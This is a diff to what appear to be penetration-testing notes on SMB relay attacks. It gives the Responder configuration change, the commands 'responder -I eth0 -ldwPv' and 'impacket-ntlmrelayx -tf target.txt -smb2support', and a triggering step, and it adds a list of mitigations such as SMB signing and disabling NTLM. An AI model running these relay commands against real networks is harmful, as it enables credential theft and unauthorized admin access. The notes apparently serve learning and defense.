@@ -32,6 +32,11 @@ The relayed user credential must be an admin
 from the responder setting (/etc/responder/Responder.conf), switch off SMB and HTTP flag
 then run the command Sudo responder -I eth0 -ldwPv
 impacket-ntlmrelayx -tf target.txt -smb2support 
+then trigger an event by pointing the attacker IP from the windows PC
 <img width="802" height="473" alt="image" src="https://github.com/user-attachments/assets/5f7b7208-57e1-45fe-bdd4-6aa267a79dc0" />
 
-
+SMB relay attacks mitigation
+a. enable smb signing on all devices
+b. disable NTLM authentication
+c. account tiering
+d. Local admin restriction
